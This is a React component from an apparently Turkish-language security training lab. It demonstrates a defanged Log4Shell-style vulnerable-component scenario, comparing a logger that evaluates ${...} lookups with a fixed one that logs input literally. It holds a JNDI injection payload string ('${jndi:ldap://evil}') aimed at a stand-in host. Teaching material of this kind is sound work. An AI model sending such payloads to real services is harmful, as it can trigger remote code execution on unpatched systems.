import { useState } from 'react'
import { proxy, MODULE03 } from '../../api.js'
import { SimCompareGrid, HowItWorks } from '../../ui.jsx'

const SENARYO = '01-vulnerable-component-log4shell-style'
const PAYLOAD = 'login ${jndi:ldap://evil}'

const STEPS = [
  'Uygulama, log almak için üçüncü taraf vulnerable_logger kütüphanesine güveniyor; kendi kodunda bariz bir hata yok.',
  'POST /log ile gönderdiğin mesaj doğrudan bu kütüphaneye geçiyor.',
  'Zafiyetli sürüm, mesajdaki ${...} ifadelerini düz veri olarak değil, "değerlendirilecek bir lookup" olarak ele alıyor (Log4Shell / CVE-2021-44228 deseni).',
  '${jndi:...} gibi bir payload görüldüğünde gerçek kütüphane uzak sınıf yükleyip RCE yapardı; burada defanged olarak [SİMÜLASYON] metni döner.',
  'Fixed sürümde bileşen güvenli sürüme pinlenmiştir: ${...} artık ayrıştırılmaz, mesaj literal string olarak loglanır.',
]

const VULN_CODE = `def _evaluate_lookup(expression: str) -> str:
    # ...
    return f"[SİMÜLASYON] Burada RCE tetiklenirdi: lookup '\${{{expression}}}' değerlendirilip uzak kod çalıştırılırdı"


def log(message: str) -> str:
    # ...
    def _replace(match: re.Match) -> str:
        return _evaluate_lookup(match.group(1))

    rendered = _LOOKUP_PATTERN.sub(_replace, message)
    line = f"INFO: {rendered}"
    print(line)
    return line`

const FIXED_CODE = `def log(message: str) -> str:
    # FIX: \${...} ifadeleri artık AYRIŞTIRILMAZ/DEĞERLENDİRİLMEZ. Mesaj ne içerirse
    # içersin literal string olarak loglanır. Girdi = veri; kod değil.
    line = f"INFO: {message}"
    print(line)
    return line`

export default function Log4ShellDemo() {
  const [message, setMessage] = useState('Kullanıcı girişi başarılı')
  const [results, setResults] = useState({})
  const [busy, setBusy] = useState(false)

  async function run() {
    setBusy(true)
    const next = {}
    for (const v of ['vulnerable', 'fixed']) {
      next[v] = await proxy(v, MODULE03, SENARYO, 'log', { method: 'POST', body: { message } })
    }
    setResults(next)
    setBusy(false)
  }

  return (
    <div>
      <header className="scenario-head">
        <h2>Senaryo 1 — Vulnerable Component / Log4Shell tarzı</h2>
        <div className="meta">CVSS 9.8 (Critical) · CWE-1395 / CWE-477 · A03:2025 · DEFANGED simülasyon</div>
        <p>
          Kusur uygulama kodunda değil, güvenilen <code>vulnerable_logger</code> bağımlılığında.
          Loglanan mesajdaki <code>{'${...}'}</code> ifadesi "değerlendirildiği" için kullanıcı girdisi
          yürütme yoluna girer. Zararsız bir mesajla ve zararlı payload ile deneyip farkı görün.
        </p>
      </header>

      <div className="actionbar">
        <div className="field" style={{ flex: 1, minWidth: 280 }}>
          <label>Log mesajı</label>
          <input value={message} onChange={(e) => setMessage(e.target.value)} style={{ width: '100%' }} />
        </div>
        <button className="btn" onClick={() => setMessage(PAYLOAD)} disabled={busy}>
          Zararlı Pattern Doldur
        </button>
        <button className="btn primary" onClick={run} disabled={busy}>
          Logla (iki sürüme)
        </button>
      </div>

      <SimCompareGrid results={results} />
      <HowItWorks steps={STEPS} vulnCode={VULN_CODE} fixedCode={FIXED_CODE} />
    </div>
  )
}
